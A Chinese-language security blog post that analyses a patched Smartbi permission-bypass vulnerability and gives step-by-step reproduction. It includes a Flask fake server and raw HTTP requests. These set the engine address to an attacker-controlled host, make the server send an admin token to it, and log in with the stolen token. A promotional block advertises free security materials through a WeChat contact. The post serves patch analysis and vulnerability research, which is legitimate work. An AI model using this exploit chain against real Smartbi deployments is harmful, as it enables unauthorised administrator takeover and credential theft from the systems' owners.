2023年7月28日Smartbi官方修复了一处权限绕过漏洞。未经授权的攻击者可利用该漏洞，获取管理员token，完全接管管理员权限。
于是研究了下相关补丁并进行分析。

## 0x01分析结果

依据补丁分析，得到如下漏洞复现步骤

### 第一步，设置EngineAddress为攻击者机器上的http服务地址

首先使用python flask搭建一个fake
server，上面只注册了/api/v1/configs/engine/smartbitoken接口，该接口返回一个json响应体

    
    
    from flask import Flask,jsonify,request  
    ​  
    ​  
    app = Flask(__name__)  
    ​  
    @app.route('/api/v1/configs/engine/smartbitoken',methods=["POST"])  
    def hello():  
    print(request.json)  
    return jsonify(hi="jello")  
    ​  
    if __name__ == "__main__":  
    app.run(host="0.0.0.0",port=8000)

![image.png](https://image.3001.net/images/20230823/1692781832_64e5cd085a57e0ec3322e.png!small)

使用如下poc，设置EngineAddress为我们的fake
server地址[http://10.52.32.43:8000](http://10.52.32.43:8000/)，

    
    
    POST /smartbi/smartbix/api/monitor/setEngineAddress/ HTTP/1.1  
    Host: 127.0.0.1:18080  
    Upgrade-Insecure-Requests: 1  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36  
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9  
    Accept-Encoding: gzip, deflate  
    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8  
    Connection: close  
    Content-Length: 23  
    ​  
    http://10.52.32.43:8000

![image.png](https://image.3001.net/images/20230823/1692781833_64e5cd099b6799ed19c25.png!small)

### 第二步，触发smartbi向我们刚刚设置的EngineAddress外发token

发送如下请求

    
    
    POST /smartbi//smartbix/api/monitor/token/ HTTP/1.1  
    Host: 127.0.0.1:18080  
    Cache-Control: max-age=0  
    Upgrade-Insecure-Requests: 1  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36  
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9  
    Accept-Encoding: gzip, deflate  
    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8  
    Connection: close  
    Content-Length: 10  
    ​  
    experiment

![image.png](https://image.3001.net/images/20230823/1692781835_64e5cd0b77ec4a027cc36.png!small)

发送相关请求后，即可在我们的fake
server上面看到了携带token的请求![image.png](https://image.3001.net/images/20230823/1692781837_64e5cd0d21cc07f883c23.png!small)

### 第三步，使用上面获取的token进行登录

    
    
    POST /smartbi//smartbix/api/monitor/login/ HTTP/1.1  
    Host: 127.0.0.1:18080  
    Upgrade-Insecure-Requests: 1  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36  
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9  
    Accept-Encoding: gzip, deflate  
    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8  
    Connection: close  
    Content-Length: 47  
    ​  
    admin_I8ac3b2d10189e80fe80fea750189ed0084f50082

返回true表示登录成功，其中的cookie就是合法的凭证

【----帮助网安学习，以下所有学习资料免费领！加vx：yj009991，备注“freebuf”获取！】

① 网安学习成长路径思维导图  
② 60+网安经典常用工具包  
③ 100+SRC漏洞分析报告  
④ 150+网安攻防实战技术电子书  
⑤ 最权威CISSP 认证考试指南+题库  
⑥ 超1800页CTF实战技巧手册  
⑦ 最新网安大厂面试题合集（含答案）  
⑧ APP客户端安全检测指南（安卓+IOS）

![image.png](https://image.3001.net/images/20230823/1692781839_64e5cd0f245b143adadec.png!small)

## 0x02分析过程

阅读相关补丁，可知此次漏洞与/smartbix/api/monitor/setServiceAddress有关![image.png](https://image.3001.net/images/20230823/1692781849_64e5cd195ae77c4dc26dd.png!small)

更进一步查看RejectSmartbixSetAddress类修补的方式，可知与smartbix.datamining.service.MonitorService类的getToken方法有关，该补丁表示如果系统中smartbix.datamining.service.MonitorService存在getToken方法就进行拦截/smartbix/api/monitor/setEngineAddress等一系列接口的请求。![image.png](https://image.3001.net/images/20230823/1692781850_64e5cd1adea3129a7be47.png!small)

分析smartbix.datamining.service.MonitorService类从头部的注解可知，该类下的所有路由都不需要认证即可访问![image.png](https://image.3001.net/images/20230823/1692781852_64e5cd1c7e34443620a41.png!small)

定位到getToken方法该方法对应的路由的/token,方法内部生成一个token，并在输入的type参数为experiment是将该token发送到系统配置中配置的ENGINE_ADDRESS

![image.png](https://image.3001.net/images/20230823/1692781853_64e5cd1db1ef52d967a2d.png!small)

![image.png](https://image.3001.net/images/20230823/1692781855_64e5cd1f5ac37ce23d532.png!small)

这意味着，只要ENGINE_ADDRESS可控，那么我们就能获取到一个合法的token

由补丁包的路由/smartbix/api/monitor/setServiceAddress定位到setEngineAddress方法可知该方法可以未授权配置ENGINE_ADDRESS![image.png](https://image.3001.net/images/20230823/1692781856_64e5cd205d8c03f6e9bde.png!small)

那意味着，只需要调用/smartbix/api/monitor/setServiceAddress接口，将ENGINE_ADDRESS设置为我们可控的伪造服务器，那么就可以从请求报文中获取到token。（这个位置经过尝试，发现伪造服务器上需要实现使用POST方法请求的/api/v1/configs/engine/smartbitoken接口，并且，响应内容为json)获取完token后，就可调用/smartbix/api/monitor/login方法进行登录![image.png](https://image.3001.net/images/20230823/1692781857_64e5cd21a776f88d2a93a.png!small)

## 0x03其他说明

上述只说明了设置ENGINE_ADDRESS利用的情况，设置SERVICE_ADDRESS进行利用的步骤也和上述类似

 **更多网安技能的在线实操练习，[请点击这里>>﻿](https://www.hetianlab.com/)**

